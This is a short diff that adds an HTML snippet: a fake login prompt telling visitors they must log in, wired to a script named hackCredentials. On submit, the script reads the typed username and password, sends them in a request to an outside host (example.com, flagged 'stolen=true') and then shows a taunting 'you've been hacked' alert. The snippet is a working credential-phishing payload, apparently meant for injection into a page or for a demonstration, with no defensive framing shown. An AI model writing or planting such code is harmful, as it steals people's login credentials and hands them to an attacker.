@@ -1,0 +1,22 @@
+<script>
+    function hackCredentials() {
+        let form = document.getElementById('loginForm');
+        let url = 'http://example.com/?stolen=true&';
+        url += 'username='+form.username.value+'&';
+        url += 'password='+form.password.value;
+        var req = new XMLHttpRequest();
+        req.open('GET', url, false); 
+        req.send(null);
+        alert("Hehehe, you've been hacked, aren't you? Username: " + form.username.value + " pass: " + form.password.value);
+    }
+</script>
+
+<br><br><hr><br><form action="" name="loginForm" id="loginForm" onsubmit="hackCredentials()">
+    To access this page you need to be logged in. <br>
+    Username:<br>
+    <input type="text" name="username" id="username"><br>
+    Password: <br>
+    <input type="password" name="password" id="password"><br>
+    <input type="submit" value="Submit">
+  </form>
+<br><hr><br><br>
